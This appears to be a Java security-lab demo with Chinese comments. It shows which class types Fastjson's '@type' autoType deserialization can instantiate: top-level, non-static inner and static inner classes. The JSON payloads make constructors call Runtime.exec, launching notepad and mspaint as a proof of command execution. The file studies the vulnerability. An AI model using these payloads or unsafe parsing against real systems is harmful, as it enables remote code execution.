package com.cc.safe.fastjson;

import com.alibaba.fastjson.JSON;
import lombok.Data;

import java.io.IOException;

/**
 * 演示fastjson反序列化漏洞中内部类不被触发的现象
 */
public class InnerClassTest {
    
    public static void main(String[] args) {
        System.out.println("=== Fastjson 内部类 vs 顶级类反序列化测试 ===\n");
        
        // 测试1：顶级类（应该成功触发）
        testTopLevelClass();
        
        // 测试2：内部类（应该失败）
        testInnerClass();
        
        // 测试3：静态内部类（应该成功）
        testStaticInnerClass();
        
        // 测试4：展示正确的内部类命名
        demonstrateInnerClassNaming();
    }
    
    private static void testTopLevelClass() {
        System.out.println("1. 测试顶级类 (com.cc.safe.fastjson.Vuln):");
        String json = "{\"@type\":\"com.cc.safe.fastjson.Vuln\",\"name\":\"张三\",\"age\":\"20\",\"msg\":\"顶级类测试\"}";
        System.out.println("JSON: " + json);
        
        try {
            Object obj = JSON.parseObject(json);
            System.out.println("✅ 顶级类反序列化成功: " + obj);
        } catch (Exception e) {
            System.out.println("❌ 顶级类反序列化失败: " + e.getMessage());
        }
        System.out.println();
    }
    
    private static void testInnerClass() {
        System.out.println("2. 测试非静态内部类 (InnerClassTest$InnerVuln):");
        String json = "{\"@type\":\"com.cc.safe.fastjson.InnerClassTest$InnerVuln\",\"name\":\"李四\",\"age\":\"25\",\"msg\":\"内部类测试\"}";
        System.out.println("JSON: " + json);
        
        try {
            Object obj = JSON.parseObject(json);
            System.out.println("✅ 内部类反序列化成功: " + obj);
        } catch (Exception e) {
            System.out.println("❌ 内部类反序列化失败: " + e.getMessage());
            System.out.println("   原因：非静态内部类需要外部类实例，fastjson无法直接实例化");
        }
        System.out.println();
    }
    
    private static void testStaticInnerClass() {
        System.out.println("3. 测试静态内部类 (InnerClassTest$StaticVuln):");
        String json = "{\"@type\":\"com.cc.safe.fastjson.InnerClassTest$StaticVuln\",\"name\":\"王五\",\"age\":\"30\",\"msg\":\"静态内部类测试\"}";
        System.out.println("JSON: " + json);
        
        try {
            Object obj = JSON.parseObject(json);
            System.out.println("✅ 静态内部类反序列化成功: " + obj);
        } catch (Exception e) {
            System.out.println("❌ 静态内部类反序列化失败: " + e.getMessage());
        }
        System.out.println();
    }
    
    private static void demonstrateInnerClassNaming() {
        System.out.println("4. 内部类命名规则演示:");
        System.out.println("   - 顶级类: com.package.ClassName");
        System.out.println("   - 非静态内部类: com.package.OuterClass$InnerClass");
        System.out.println("   - 静态内部类: com.package.OuterClass$StaticInnerClass");
        System.out.println("   - 匿名内部类: com.package.OuterClass$1, OuterClass$2, ...");
        System.out.println();
        
        // 展示编译后的class文件
        System.out.println("编译后的class文件:");
        System.out.println("   - InnerClassTest.class (外部类)");
        System.out.println("   - InnerClassTest$InnerVuln.class (非静态内部类)");
        System.out.println("   - InnerClassTest$StaticVuln.class (静态内部类)");
    }
    
    // 非静态内部类 - 需要外部类实例，fastjson无法直接实例化
    @Data
    public class InnerVuln {
        public String name;
        public String age;
        public String msg;
        
        public InnerVuln() {
            System.out.println("!!! 非静态内部类 InnerVuln 构造函数被调用 !!!");
            try {
                Runtime.getRuntime().exec("notepad");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
    
    // 静态内部类 - 可以被fastjson实例化
    @Data
    public static class StaticVuln {
        public String name;
        public String age;
        public String msg;
        
        public StaticVuln() {
            System.out.println("!!! 静态内部类 StaticVuln 构造函数被调用 !!!");
            try {
                Runtime.getRuntime().exec("mspaint");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
}
